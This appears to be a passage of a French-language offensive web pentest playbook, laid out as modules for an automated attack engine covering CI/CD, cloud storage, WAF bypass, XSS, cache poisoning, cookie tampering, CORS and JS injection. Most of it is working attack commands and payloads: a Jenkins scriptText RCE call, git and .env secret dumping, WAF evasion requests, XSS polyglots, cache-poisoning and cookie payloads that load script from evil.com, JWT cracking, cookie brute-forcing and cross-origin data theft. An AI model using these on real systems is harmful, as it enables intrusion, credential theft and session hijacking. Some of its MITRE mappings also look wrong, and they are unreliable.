# Analyse secrets
grep -iR 'key\|token\|pass\|secret' /loot/git/
```

---

## ⚙️ PHASE 4 — Déclenchement conditionnel

| Condition | Action |
|----------|--------|
| Jenkins détecté → accès console ? | tester payload : `id`, reverse shell |
| `.git/config` OK ? | dump complet + grep creds |
| GitLab API accessible ? | bruteforce endpoints |
| `.env` exposé ? | extraction tokens + pivot vers cloud |
| `*.log` ou `*.zip` en accès direct ? | analyse offline & fingerprint scripts |

---

## 🧨 PHASE 5 — Réaction

| Scénario | Action |
|----------|--------|
| Jenkins RCE confirmé | shell ou escalade systeme |
| GitLab token découvert | accès API / codebase / pipeline |
| Artefact contient credentials | pivot Cloud / Database |
| Build log → accès interne | reverse shell via job injection |

---

## 🛠️ PHASE 6 — Commandes typiques générées

```bash
# Jenkins exploit
curl -X POST -d "script=whoami" https://target/scriptText

# GitLab exfil
curl https://target/.gitlab-ci.yml
curl https://target/api/v4/projects

# Dump git
git-dumper https://target/.git ./loot/git
grep -r "password\|token" ./loot/git/

# Artefacts et logs
curl https://target/builds/latest.log
feroxbuster -u https://target -x .zip,.war,.jar,.log

# Secret hunting
gf secrets | xargs -I {} curl https://target/{}
```

---

## 📤 PHASE 7 — OUTPUTS

```
/output/web/<target>/cicd/jenkins_console_rce.txt  
/output/web/<target>/cicd/gitlab_projects_dump.json  
/output/web/<target>/cicd/leaked_env.txt  
/output/web/<target>/cicd/artifacts_analysis.log  
/output/web/<target>/cicd/secrets_extracted.txt  
```

---

## 🧭 PHASE 8 — MITRE / CWE / CVE Mapping

| Réf. | Description |
|------|-------------|
| T1203 | Exploitation d'application accessible |
| T1552.001 | Dump `.env` ou `.config` secrets |
| T1129 | Abuse CI/CD remote service |
| CWE-502 | Deserialization (Jenkins, GitHub Actions runners) |
| CWE-538 | Info Leak via build logs |
| CVE-2018-1000861 | Jenkins RCE |

---

# ⚙️ MODULE : `engine_web_cloud_hosting(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebCloudHostingEngine

```ts
HeuristicWebCloudHostingEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  ip: string,
  headers: [string],
  js_files: [string],
  bucket_uris: [string],
  cdn_mapped: boolean,
  cname_pointing: string,
  file_leaks: [string],
  config_keys_exposed: [string],
  storage_platform: AWS | Azure | GCP | Firebase | Unknown
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal

```ts
Signal {
  source: URI | Header | JS | DNS,
  type: Leak | Misconfig | Takeover | SecretPattern,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis

```ts
Hypothesis {
  type: PublicStorageExposure | CredentialLeak | DNSCloudTakeover | JSKeyDisclosure,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: Medium | High | Critical,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔬 PHASE 1 — Observation & Fingerprint

| Élément | Méthode |
|---------|---------|
| JS Token | `grep -E 'AKIA|AIza|ghp_|firebase' *.js` |
| Buckets publics | `s3.amazonaws.com`, `.blob.core.windows.net`, `firebaseio.com`, `.googleapis.com` |
| Fichiers sensibles | `.env`, `.yml`, `.json`, `.bak`, `assetlinks.json`, `robots.txt` |
| CNAME → CDN | analyse via `dig`, `host`, `subjack`, `dnstwist` |
| Headers | `X-Cache`, `Server: AmazonS3`, `Via: CloudFront` |

---

## 🎯 PHASE 2 — Matching Hypothèses

| Hypothèse | Preuves |
|----------|---------|
| Takeover DNS (CloudFront / AzureCDN) | 404 CDN + CNAME + mismatch |
| Bucket public (AWS S3) | accès `s3://` + listable files |
| Secret dans config (GCP/Firebase) | `.env`, `.json`, `firebase.js` |
| JS Token (AKIA, AIza, ghp_) | trouvé dans HTML, source JS ou fichier |

---

## 🧪 PHASE 3 — Test Plans

```bash
# AWS S3 public check
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/.env ./loot/

# Azure Blob
az storage blob list --container-name c --account-name a --public-access

# GCP/Firebase
curl https://storage.googleapis.com/bucket/file.json
curl https://target.firebaseio.com/.json

# DNS Takeover
dig cname target.com
subfinder -d target.com | subjack -ssl -t 50

# File leaks
feroxbuster -u https://target -x .env,.json,.yml,.bak -w configpaths.txt

# Token hunt JS
gf secrets js/ | xargs -I {} curl https://target/{}
grep -E "AKIA|ghp_|AIza|firebase" js/*.js
```

---

## ⚙️ PHASE 4 — Déclenchement conditionnel

| Condition | Action |
|----------|--------|
| `s3://` access OK | Dump public file list |
| `.env` ou `.json` trouvé | grep secrets & inject |
| CNAME → 404 CDN | takeover (404 → deploy) |
| Clé Firebase exposée | test API abuse (read/write) |
| `assetlinks.json` → webapp | test rebind / abuse |

---

## 🧨 PHASE 5 — Réaction & Post-Exploitation

| Élément trouvé | Action |
|----------------|--------|
| `AKIA...` | AWS IAM abuse: enumerate perms, assume role |
| `.env` avec `DB_` | SQL access / RCE injection |
| Token Firebase | dump realtime DB, upload payload |
| DNS takeover | create PoC / mirror fake site |
| `.bak` ou `~` fichiers | reverse parse & inject |
| Google Storage public | retrieve files / json pour userID enum |

---

## 🛠️ PHASE 6 — Commandes typiques générées

```bash
# AWS S3
aws s3 ls s3://vuln-bucket --no-sign-request
aws s3 cp s3://vuln-bucket/db_backup.sql.gz .

# Azure blob
az storage blob list -c container --account-name vuln --public-access

# GCP
curl https://storage.googleapis.com/vuln-app/.env
curl https://vuln.firebaseio.com/.json

# Token detection
curl https://target/js/app.js | grep -E "AKIA|AIza|ghp_"

# Takeover detection
subfinder -d vuln.com | subjack -ssl -t 50 -v

# Leak hunt
feroxbuster -u https://target -x .env,.json,.yml,.bak
```

---

## 📤 PHASE 7 — OUTPUTS

```
/output/web/<target>/cloud_hosting/bucket_list.txt  
/output/web/<target>/cloud_hosting/config_secrets.env  
/output/web/<target>/cloud_hosting/js_tokens_extracted.txt  
/output/web/<target>/cloud_hosting/dns_takeover_possible.txt  
/output/web/<target>/cloud_hosting/assetlinks_leak.log  
```

---

## 🧭 PHASE 8 — MITRE / CWE / CVE Mapping

| Réf. | Description |
|------|-------------|
| T1210 | Exploitation de service exposé cloud |
| T1529 | Abuse des ressources cloud |
| T1552.007 | Leak de fichiers cloud de configuration |
| T1190 | DNS Takeover |
| CWE-538 | Informations exposées (logs, fichiers temp) |
| CWE-200 | Exposure of Sensitive Information to Unauthorized Actor |

---

# ⚙️ MODULE : `engine_web_waf_bypass(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebWAFBypassEngine

```ts
HeuristicWebWAFBypassEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  waf_vendor: string,
  cloud_provider: string,
  backend_tech: string,
  headers: [string],
  http_response_code: int,
  filtering_triggered: boolean,
  keyword_blocked: [string],
  waf_signature: [string],
  known_bypass: boolean
}
```

---

## 📍 [TYPE_ABSTRAIT] Signal

```ts
Signal {
  source: HTTPResponse | Header | RegexMatch | Fingerprint,
  type: WAFTrigger | Anomaly | SignatureDetection,
  content: string,
  confidence: Low | Medium | High,
  metadata: any
}
```

---

## 💡 [TYPE_ABSTRAIT] Hypothesis

```ts
Hypothesis {
  type: WAFFiltering,
  evidence: Signal[],
  probable_cwe: [CWE],
  impact: High,
  confirmed: boolean,
  test_plan: Experiment[]
}
```

---

## 🔬 PHASE 1 — Observation & Détection WAF

| Élément | Méthode |
|--------|--------|
| Header | `Server`, `X-CDN`, `X-Akamai`, `CloudFront`, `Sucuri`, `ModSecurity`, `X-Powered-By` |
| Anomalie de réponse | HTTP 403, 406, 501, 999, reset TCP |
| JS Challenge / CAPTCHA | Regex JS redirect / 5s delay |
| Outils | `wafw00f`, `nmap -p80 --script=http-waf-detect` |

```bash
# WAF fingerprinting
wafw00f https://target
nmap -p80 --script http-waf-detect <target>
```

---

## 🎯 PHASE 2 — Matching Hypothèses

| Scénario | Détection |
|----------|-----------|
| WAF déclenche 403 → probable filtre lexical |
| Résultat altéré selon User-Agent → polymorphisme HTTP |
| Blocage selon payload URI ou param | signature-level filtering |
| Réponse altérée uniquement POST | méthode ciblée |

---

## 🧪 PHASE 3 — Plan de tests WAF Bypass

```bash
# Fuzzing GET/POST avec bypass payloads
wfuzz -z file,payloads/waf-bypass.txt -u https://target/?q=FUZZ

# HTTP method tampering
curl -X HEAD https://target/login
curl -X PATCH https://target/login

# Header injection
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Forwarded-For: 127.0.0.1" https://target/

# Encodage + Cloaking
curl -G https://target/search --data-urlencode "q=<script>alert(1)</script>"
curl https://target?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Payload split
curl https://target -d "us%0Der=admin&pass=admin"
curl -X POST -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\n' https://target
```

---

## ⚙️ PHASE 4 — Exécution conditionnelle

| Trigger détecté | Action |
|-----------------|--------|
| 403 sur `<script>` | encoder payload (hex, base64, unicode) |
| JS redirect / challenge | simuler navigateur, user-agent spoof |
| Block POST | tenter GET/PUT/HEAD/TRACE avec même param |
| DNS challenge | test DNS rebinding ou bypass en proxy |

---

## 🧨 PHASE 5 — Réactions & Replays

| Résultat | Réaction |
|----------|----------|
| Payload accepté | répéter avec payload exploitant vuln app |
| Filtre contourné | injection SQL/XSS effective |
| Chunked encoding OK | enchaîner double encoding |
| Token GET bypass → admin | pivot pour exfil / action destructrice |

---

## 🛠️ PHASE 6 — Commandes typiques générées

```bash
# Fingerprinting
wafw00f https://target
nmap --script=http-waf-detect -p 80 https://target

# Basic payload test
curl -X POST -d "q=<script>alert(1)</script>" https://target/search

# Cloaking + encoded
curl -G --data-urlencode "q=<script>alert(1)</script>" https://target
curl "https://target/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Method bypass
curl -X HEAD https://target/admin
curl -X PUT https://target/login

# Transfer-Encoding tricks
curl -X POST -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\n' https://target

# SSRF + internal redirect
curl -H "Host: 127.0.0.1" https://target/
```

---

## 📤 PHASE 7 — OUTPUTS

```
/output/web/<target>/waf/fingerprint.log  
/output/web/<target>/waf/filtered_payloads.txt  
/output/web/<target>/waf/bypass_success.log  
/output/web/<target>/waf/transfer_encoding.log
```

---

## 🧭 PHASE 8 — MITRE / CWE / CVE Mapping

| ID | Description |
|----|-------------|
| T1201 | WAF Bypass & Filtering Evasion |
| T1071.001 | Application Layer Protocol abuse |
| T1595.002 | Web Service Filtering Bypass |
| CWE-444 | Inconsistent Interpretation of HTTP Requests |
| CWE-179 | Incorrect Execution-Order of Operations |

---

# ⚙️ MODULE : `engine_web_html_injection(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebHTMLInjectionEngine

```ts
HeuristicWebHTMLInjectionEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  uri_patterns: string[],
  forms: HTMLForm[],
  parameters: URLParam[],
  reflection_context: [DOMContext],
  encodings: [string],
  js_presence: boolean,
  sanitization: Weak | Strong | None
}
```

---

## 🎯 [TYPE_ABSTRAIT] DOMContext

```ts
DOMContext {
  type: HTML | JS | Attr | EventHandler | CSS | Comment,
  reflected_value: string,
  sink_type: SinkInline | SinkJS | SinkAttr | SinkMeta,
  sandbox: boolean
}
```

---

## 🔍 PHASE 1 — Observation des Signaux

| Élément observé | Méthode |
|------------------|---------|
| Reflet dans DOM | curl + grep / grep -A1 |
| Reflet dans attribut HTML | `<input value="...">` |
| Reflet dans `script`, `onload` | Firefox Devtools + source |
| `view-source:` | vérifie inclusion brute |
| Tags non échappés | `<`, `>`, `"`, `'`, `/` |

---

## 📌 PHASE 2 — Matching Hypothèses

| Hypothèse | Signaux |
|-----------|---------|
| Reflet brut sans échappement → vulnérabilité potentielle |
| Reflet dans `script` | → possible XSS inline |
| Reflet dans attribut `on*` | → DOM-Based XSS |
| Réponse change selon payload | → filtre JS ou HTML |

---

## 🧪 PHASE 3 — Test Plan

```bash
# Reflet brut
curl "https://target/page?q=<h1>test</h1>"

# Reflet + contexte
curl "https://target/page?q=<script>alert(1)</script>"

# Event handler bypass
curl "https://target/page?q=\" onmouseover=alert(1) x=\""

# Encodage trick
curl "https://target/page?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"

# DOM injection simulée
echo '<input value="XSS">' | pup 'input attr{value}'

# Scanner automatisé
dalfox url "https://target/page?q=INJECT_HERE" -b your-burp-collaborator-url
```

---

## 🧨 PHASE 4 — Execution Conditionnelle

| Condition | Action |
|-----------|--------|
| Reflet dans HTML brut | injection directe `<script>`, `<img>` |
| Reflet dans attribut HTML | bypass `"` ou `'`, injection onmouseover |
| Reflet dans JS | injection `';alert(1)//` ou template injection |
| Reflet désactivé en GET mais actif en POST | test changement de méthode |
| Filtres actifs | test double encodage / unicode / comment closure |

---

## 🧬 PHASE 5 — Payloads Variants

```bash
# Basique
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

# Polyglot
"><svg onload=alert(1)>//
<iframe src="javascript:alert(1)"></iframe>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">

# Encodés
%3Cscript%3Ealert(1)%3C/script%3E
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# DOM Polyglot
"><img src=x onerror=confirm(document.domain)>//
```

---

## 🛠️ PHASE 6 — Outils de référence

```bash
# Dalfox
dalfox url "https://target/page?q=INJECT_HERE"

# XSStrike
xsstrike -u "https://target/page?q=" --crawl --blind

# KNOXSS
curl -X POST -d "url=https://target/?q=" https://knoxss.me/api/

# XSS Hunter
Utilisation en mode blind + webhook tracker
```

---

## 🔁 PHASE 7 — Réaction dynamique

| Résultat | Réponse |
|----------|---------|
| Reflet confirmé → générer payload chainé |
| Injection réussie dans event handler | pivot JS / hook BeEF |
| Reflet caché dans iframe | tester DOM pollution |
| Aucun effet brut | test CSP bypass, sandbox, ShadowDOM |
| Error JSON → injection JS dans API | → router vers `engine_web_api()` |

---

## 📤 PHASE 8 — OUTPUTS

```
/output/web/<target>/xss/html_reflections.txt
/output/web/<target>/xss/triggered_alerts.log
/output/web/<target>/xss/auto_payloads_chain.json
```

---

## 🧭 PHASE 9 — MITRE / CWE Mapping

| ID | Description |
|----|-------------|
| T1059.007 | JavaScript Execution in Client |
| T1189 | Drive-by Compromise |
| CWE-79 | Improper Neutralization of Input During Web Page Generation |
| CWE-80 | Improper Encoding or Escaping of Output |
| CWE-116 | Improper Encoding or Escaping of Output |

---

# ⚙️ MODULE : `engine_web_browser_cache_poison(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebCachePoisoningEngine

```ts
HeuristicWebCachePoisoningEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation[],
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  cache_headers: CacheControl[],
  cdn_present: boolean,
  vary_headers: string[],
  x_forwarded_headers: string[],
  payload_reflectable: boolean,
  weak_normalization: boolean,
  auth_bypassable: boolean,
  file_extensions: string[],
  route_multiplexing: boolean
}
```

---

## 🔍 PHASE 1 — Observation : détection comportement cache

| Élément | Indicateur |
|--------|------------|
| Headers | `Cache-Control`, `Expires`, `Vary`, `ETag`, `Age`, `Last-Modified`, `X-Cache` |
| CDN | Présence d’Akamai, CloudFront, Cloudflare, Fastly |
| Variabilité | `Vary: X-Forwarded-Host`, `User-Agent`, `Accept-Encoding` |
| Réponse identique vs paramètres | Test GET `/index?debug=1` |

```bash
curl -I https://target/
curl -I -H "X-Forwarded-Host: evil.com" https://target/
curl -H "User-Agent: payload" https://target/
```

---

## 📌 PHASE 2 — Matching Hypothèses

| Hypothèse | Condition |
|----------|-----------|
| Contenu mis en cache | `200 OK` avec `Cache-Control: public` |
| Cache partagé (proxy, CDN) | Présence `X-Cache`, CDN |
| Vary headers non filtrés | Injection de headers non traités |
| Requête influencée par paramètre | `/?q=payload` visible dans la réponse |
| Cache split | Contenu variable cacheable non différencié |

---

## 🧪 PHASE 3 — Test Plans (outils, payloads, POC)

```bash
# Poison via X-Forwarded
curl -H "X-Forwarded-Host: evil.com" https://target/page

# Poison via param
curl "https://target/page?lang=en<script>alert(1)</script>"

# Inject ETag avec payload
curl -H "If-None-Match: <script>alert(1)</script>" https://target/

# Inject dans JSON ou inline JS
curl "https://target/page?q=</script><script src=evil.js></script>"

# curl vs browser → effet de cache
```

---

## 🔄 PHASE 4 — Exécution conditionnelle

| Condition | Action |
|-----------|--------|
| Cache-Control: public, max-age | tester injection cacheable |
| Pas de `Vary` header | injecter User-Agent, X-Forwarded, Accept |
| Réponse CDN présente | test CDN poisoning inter-client |
| Contenu inline JS ou HTML réinjecté | injection script/marqueur |

---

## 🧨 PHASE 5 — Payloads de cache poisoning

```js
<script src="https://evil.com/x.js"></script>
<style>body{background:red}</style>
<!--#include file="shell.php" -->
<svg onload=alert(1)>
```

**Injection positionnée dans** :
- URL (GET param)
- Header (`X-Forwarded-Host`, `Host`, `X-Original-URL`)
- Cookie (si exploité côté serveur)
- HTML reflecté (`</script><script>`)

---

## 🧠 PHASE 6 — Raisonnement heuristique

- Si CDN présent → tester plusieurs régions (CloudFront + Fastly)
- Si cache réutilisé cross-user → simulateur multi-client avec `curl --header`, `cache-tester.py`
- Si `/js/app.js` vulnérable → tenter JS poisoning
- Si cache POI/BOA sans filtrage → injecter et observer Time-To-Live (`Age:` header)

---

## 🔁 PHASE 7 — Réaction dynamique

| Résultat | Réaction |
|----------|----------|
| Payload présent dans cache cross-req | pivot → hook BeEF, JS implant |
| Reflet HTML avec TTL > 600s | RCE persistante sur page |
| CDN partagé impacté | compromission supply-chain apparente |
| Header influençable | pivot vers `engine_web_reverse_proxy()` |

---

## 📤 PHASE 8 — OUTPUTS

```
/output/web/<target>/cache_poisoning/headers.log
/output/web/<target>/cache_poisoning/injected_payloads.json
/output/web/<target>/cache_poisoning/reflected_cache_hit.txt
```

---

## 📚 PHASE 9 — MAPPINGS MITRE / CWE

| Référentiel | ID | Description |
|-------------|----|-------------|
| MITRE ATT&CK | T1189 | Drive-by Compromise |
| MITRE ATT&CK | T1555.003 | Steal Web Session Cookie |
| CWE | CWE-113 | Improper Neutralization of CRLF |
| CWE | CWE-749 | Exposed Cache Poisoning |
| CWE | CWE-1021 | Improper Neutralization of Header |

---

# ⚙️ MODULE : `engine_web_cookie_manipulation(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCookieTamperEngine

```ts
HeuristicCookieTamperEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation[],
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  cookie_behavior: CookiePolicy[],
  session_id_detected: boolean,
  auth_token_type: string, // JWT, Base64, UUID, Signed
  cookie_scope: string[],  // Path, Domain
  httpOnly: boolean,
  secure_flag: boolean,
  samesite_policy: string, // Strict / Lax / None
  set_cookie_response: string[],
  exposed_scripts: string[],
  client_side_eval: boolean
}
```

---

## 🔍 PHASE 1 — Observation (Headers & JS)

| Élément observé            | Signal détecté                      |
|---------------------------|-------------------------------------|
| `Set-Cookie` HTTP header  | `session=`, `auth=`, `token=`       |
| JS : `document.cookie`    | Accès client-side (non httpOnly)    |
| Cookies non chiffrés      | Clés exposées (base64, JWT, UUID)   |
| Flags absents             | `Secure`, `HttpOnly`, `SameSite`    |
| Cookies reflétés          | HTML ou JS utilisant cookie         |
| Cookies persistants       | Présents sans expiration logique    |

---

## 🧠 PHASE 2 — Matching Hypothèses

| Hypothèse                            | Condition correspondante |
|-------------------------------------|---------------------------|
| Cookie non signé                    | UUID ou base64 simple    |
| Session prévisible ou réutilisable  | séquence ou absence de timestamp |
| CSRF possible                       | Absence de SameSite      |
| Cookie modifiable côté client       | `document.cookie = ...`  |
| Cookie réinjecté                    | Reflet JS ou HTTP        |
| Token statique                      | Même valeur entre users  |
| Auth token en clair                 | JWT non chiffré, HS256 faible |

---

## 🧪 PHASE 3 — Test Plans

```bash
# Observation des headers et cookie flags
curl -I https://target/

# Tamper cookie auth
curl -b "auth=admin" https://target/profile

# Injection cookie → XSS ou bypass
curl -b "session=<script>alert(1)</script>" https://target/

# JWT crack
jwt_tool -C eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Cookie fixation (login + token static)
burp proxy → inject before login

# Cookie brute via rockyou
ffuf -b "auth=FUZZ" -w rockyou.txt -u https://target/dashboard
```

---

## 🔄 PHASE 4 — Exécution conditionnelle

| Condition                                 | Action |
|------------------------------------------|--------|
| JWT non chiffré détecté                  | Bruteforce HS256, test header tamper |
| Cookie non httpOnly                      | Accès via XSS / JS |
| Cookie réinjecté dans HTML               | Injection ou cache poisoning |
| Secure flag absent en HTTPS              | Session sniff possible |
| SameSite=None + Auth + POST              | Tentative CSRF |
| Auth=admin accepté                       | Pivot vers enum et escalade |

---

## 🧨 PHASE 5 — Payloads de tampering

```bash
auth=admin
auth={"role":"admin","uid":0}
session=<script src=//evil.com/x.js></script>
auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
admin=1; role=admin; bypass=1
```

---

## 📡 PHASE 6 — Scripts et outils

- 🔹 **jwt_tool**
- 🔹 **ffuf** → bruteforce cookie
- 🔹 **nuclei** : `misconfig/cookie-bad.yaml`
- 🔹 **burp** : cookie tamper, fixer, repeater replay
- 🔹 **Postman** / **curl** : tests REST + cookie replay

---

## 🧠 PHASE 7 — Réactions heuristiques

| Observation | Réaction |
|-------------|----------|
| Cookie valide mais non httpOnly | XSS → steal session |
| Cookie fixe pour tous users | brute ou clonage |
| JWT HS256 crackable | payload override (admin=true) |
| Session cookie predictable | timing attack ou forge |
| Pas de `Secure` → sniff sur open Wi-Fi |

---

## 📤 PHASE 8 — OUTPUTS

```
/output/web/<target>/cookies/header_dump.log
/output/web/<target>/cookies/payloads_tested.txt
/output/web/<target>/cookies/bypass_success.flag
```

---

## 📚 PHASE 9 — Mapping MITRE / CWE

| Standard | ID | Description |
|----------|----|-------------|
| MITRE    | T1071.001 | Web Service Abuse |
| MITRE    | T1539 | Steal Web Session Cookie |
| CWE      | CWE-565 | Session Token Without HttpOnly Flag |
| CWE      | CWE-613 | Insecure JWT Validation |
| CWE      | CWE-16 | Configuration |

---

# ⚙️ MODULE : `engine_web_cors(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCORSEngine

```ts
HeuristicCORSEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation[],
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  access_control_allow_origin: string[],
  access_control_allow_credentials: boolean,
  origin_reflection: boolean,
  methods_allowed: string[],
  headers_allowed: string[],
  cors_misconfig_risk: boolean,
  js_context_origin: string
}
```

---

## 🔍 PHASE 1 — Observation : Header & comportement JS

| Élément observé                     | Signal détecté                            |
|------------------------------------|-------------------------------------------|
| `Access-Control-Allow-Origin: *`   | Potentiel vol de données cross-site       |
| `Access-Control-Allow-Credentials: true` + origine wildcard | CORS critique |
| Réflexion de l’`Origin`            | CORS Reflective                          |
| `OPTIONS` / `Preflight` sans contrôle | CORS permissif                       |
| `fetch(..., credentials: "include")` dans JS | Indice sensible                      |

---

## 🧠 PHASE 2 — Matching Hypothèses

| Hypothèse                                       | Condition déclenchement |
|------------------------------------------------|--------------------------|
| Origin arbitraire accepté                      | `Access-Control-Allow-Origin: *` |
| Origin injecté est accepté                     | Réflexion header          |
| `Allow-Credentials` actif + Wildcard origin    | FAIL → bypass cookie      |
| Méthodes sensibles exposées (`PUT`, `DELETE`)  | XSS possible              |
| Données privées exposables                     | APIs privées accessibles  |

---

## 🧪 PHASE 3 — Test Plans

```bash
# Test réflexion de l’origine
curl -H "Origin: https://evil.com" -I https://target/

# Test crédential inclusion avec JS / Fetch
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -I https://target/

# Préflight OPTIONS
curl -X OPTIONS https://target/api/private -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST"

# Test cross-origin with credentials from browser
fetch("https://target/api/private", {
  credentials: "include",
  method: "GET"
})
```

---

## 🔄 PHASE 4 — Exécution conditionnelle

| Détection                                  | Action |
|--------------------------------------------|--------|
| ACAO == "*" + Allow-Credentials: true     | Critical → Theft via JS |
| Origin injecté accepté                     | Cross-domain hijack |
| Headers sensibles (`Authorization`)        | Test XHR access |
| JSON privé exposé → `eval()` dans script   | JS injection possible |

---

## 🧨 PHASE 5 — Payloads de test

```http
Origin: https://evil.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Authorization

JS:
fetch("https://target/api/private", {
  method: "GET",
  credentials: "include"
})
.then(r => r.text()).then(console.log)
```

---

## 🔧 PHASE 6 — Outils utilisés

- **CORStest.py**
- **curl**
- **nuclei** → `misconfig/cors-*.yaml`
- **custom JS payload**
- **Burp Suite** + CORS POC generator
- **Postman + credentials mode**

---

## 🔥 PHASE 7 — Réaction & exploitation

| Cas détecté | Réaction stratégique |
|-------------|----------------------|
| Origin arbitraire accepté | voler données via Fetch/XHR |
| Cookies accessibles cross-domain | détourner session |
| Tokens / API exposés        | abuse backend/privileges |
| CORS sur API sensible       | SSRF ou escalade potentielle |

---

## 📁 PHASE 8 — OUTPUTS STRUCTURÉS

```
/output/web/<target>/cors/cors_headers.log
/output/web/<target>/cors/reflected_origins.txt
/output/web/<target>/cors/exploitable_points.md
```

---

## 📚 PHASE 9 — MAPPINGS : MITRE / CWE / OWASP

| Source | ID        | Description |
|--------|-----------|-------------|
| MITRE  | T1185     | Browser Session Hijacking |
| CWE    | CWE-346   | Origin Validation Bypass |
| CWE    | CWE-942   | Overly Permissive CORS Policy |
| OWASP  | A05:2021  | Security Misconfiguration |

---

# ⚙️ MODULE : `engine_web_js_injection(target: WebTarget)`

---

## 🧠 [TYPE_ABSTRAIT] HeuristicJSInjectionEngine

```ts
HeuristicJSInjectionEngine {
  observe(target: WebTarget) → Signal[],
  match(signal: Signal) → Hypothesis[],
  test(hypothesis: Hypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation[],
  reason(observation: Observation) → NextStep[],
  react(next: NextStep) → CommandePentest[]
}
```

---

## 📦 [TYPE_ABSTRAIT] WebTarget

```ts
WebTarget {
  fqdn: string,
  uris: string[],
  scripts_inline: boolean,
  dom_interaction_detected: boolean,
  reflect_user_input: boolean,
  suspicious_query_param: boolean,
  external_scripts: string[],
  js_vars_controlled: [string],
  vuln_surface: [Signal]
}
```

---

## 🔍 PHASE 1 — Observation : DOM & Script Analysis

| Élément observé                      | Signal déclencheur                        |
|-------------------------------------|-------------------------------------------|
| Variables dynamiques via `eval()`, `document.write`, `innerHTML`, `setTimeout(code)` | Injection directe possible |
| JS inline modifiable                | DOM injection                            |
| Paramètres URL reflétés dans JS     | XSS / JSONP risk                          |
| Imports de scripts externes        | Supply chain injection possible           |
| Paramètres dans `window.location`, `document.referrer`, `hash`, `cookie` utilisés en JS | vecteurs classiques DOM-based XSS |

---

## 🧠 PHASE 2 — Matching Hypothèses

| Hypothèse                                     | Détail technique                           |
|-----------------------------------------------|--------------------------------------------|
| DOM XSS via `innerHTML`, `document.write`     | user input injecté dans le DOM             |
| JS context injection (`eval`)                 | data utilisée comme JS                     |
| JS object manipulation → prototype pollution  | injection `__proto__`                      |
| Script externe modifiable                     | supply chain compromise                    |
| Insertion via `script src=` dynamique         | DOM-to-JS SSRF possible                    |

---

## 🧪 PHASE 3 — Test Plans

```bash
# DOM XSS détectable
https://target.com/page?param=<script>alert(1)</script>

# Hash injection
https://target.com/#<img src=x onerror=alert(2)>

# JSONP & Callback injection
https://target.com/api?callback=alert(3)

# Pollution prototype (JS objects)
curl -X POST -H "Content-Type: application/json" -d '{"__proto__": {"admin": true}}' https://target/api

# Analyse JS auto :
- linkfinder.py
- jsfinder
- burp/jsbeautify + DOM Invader

# Payload typiques :
<script>alert(1)</script>
"><svg/onload=confirm`1`>
"><script src=//evil.js></script>
```

---

## 🔄 PHASE 4 — Exécution conditionnelle

| Condition                                         | Action déclenchée                          |
|--------------------------------------------------|--------------------------------------------|
| DOM modifiable avec `document.write`             | inject payload HTML/JS                     |
| `eval(input)` détecté                            | inject chaîne malformée                    |
| Input via URL → script                           | test alert()                               |
